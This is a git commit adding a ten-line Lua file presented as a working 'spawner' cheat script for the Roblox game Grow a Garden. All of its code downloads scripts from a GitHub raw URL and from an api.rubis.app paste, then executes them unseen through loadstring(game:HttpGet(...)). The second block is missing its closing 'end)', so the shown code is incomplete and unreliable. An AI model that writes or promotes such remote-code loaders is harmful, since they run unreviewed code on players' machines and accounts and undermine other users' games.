ae105d3cad494bcf7bca584a9aceade7aeeccede
Roblox Scripts <gregyheport@gmail.com>
2025-07-22 18:00:21 +0800

    Create X-Hub-Spawner-Script-GrowAGarden-Working.lua

---
+++ X-Hub-Spawner-Script-GrowAGarden-Working.lua
@@ -0,0 +1,10 @@
+pcall(function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/GrowAGarden-X-Hub-Spawner.lua"))()
+end)
+
+task.wait(1.5)
+
+pcall(function()
+
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/NtweI5JMMdfkwiwi/raw", true))()
